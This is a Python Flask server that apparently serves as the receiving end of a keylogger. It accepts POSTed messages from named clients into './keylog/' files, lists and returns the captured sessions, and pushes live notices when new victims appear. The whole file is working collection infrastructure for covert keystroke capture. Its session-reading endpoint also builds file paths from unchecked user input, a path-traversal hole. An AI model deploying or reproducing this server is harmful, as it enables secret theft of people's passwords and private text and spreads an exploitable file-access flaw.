from flask import Flask, request, jsonify,render_template, Response
import secrets
import string
import os
from datetime import datetime

ROOT = "./keylog/"
app = Flask(__name__)

def generate_random_string(length=10):
    alphabet = string.ascii_letters + string.digits
    return ''.join(secrets.choice(alphabet) for _ in range(length))

@app.route('/getallsession', methods=['GET'])
def getallsession():
    filenames = os.listdir(ROOT)
    data = []
    for filename in filenames:
        data.append(filename.split(".txt")[0])
    return jsonify(data)

@app.route('/getsessioncontent', methods=['GET'])
def getsessioncontent():
    filename = request.args.get("sessionDataItem")
    f = open(os.path.join(ROOT, filename + ".txt"))
    data = f.read()
    return jsonify(data)

@app.route('/getname', methods=['GET'])
def getname():
    random_string = generate_random_string()
    return random_string



@app.route('/rec', methods=['POST'])
def receive_message():
    try:
        data = request.json  # Assuming the client sends JSON data in the request body
        print(data)
        if data:
            clientname = data["client_name"]
            client_path = os.path.join(ROOT, clientname + ".txt")
            f_client = open(client_path, 'a+')
            current_time = str(datetime.now())
            f_client.write(current_time + "\t" + data['message'])
            # Do something with the received data
            response_message = f"Saved data: {data['message']} to {client_path}"
            return jsonify({"response": response_message})
        else:
            return jsonify({"error": "No data received"}), 400
    except Exception as e:
        return jsonify({"error": str(e)}), 500
import time

# def event_stream():
#         previous = len(os.listdir(ROOT))
#         while True:
#             curr = len(os.listdir(ROOT))
#             if curr != previous:
#                 print("change")
#                 yield "data: change"
#                 previous = curr
#             yield "data: temp"
#             time.sleep(1)

def event_stream():
    # count = 0
    # while True:
    #     time.sleep(1)  # Simulate some processing time
    #     count += 1
    #     print(count)

    #     # yield "{data: 'tom'\n\n}"
    #     yield f"data: 2\n\n"
    #     # yield "data:1"
    
    previous = len(os.listdir(ROOT))
    while True:
        data = "helo guide"
        time.sleep(1)
        curr = len(os.listdir(ROOT))
        if curr != previous:
            print("change")
            yield "data: session change\n\n"
            previous = curr

@app.route('/sse-endpoint')
def sse():
    return Response(event_stream(), content_type='text/event-stream')

@app.route('/', methods=['GET'])
def index():
    return render_template('index.html')

if __name__ == '__main__':
    app.run(host="0.0.0.0",port=8555,debug=False)
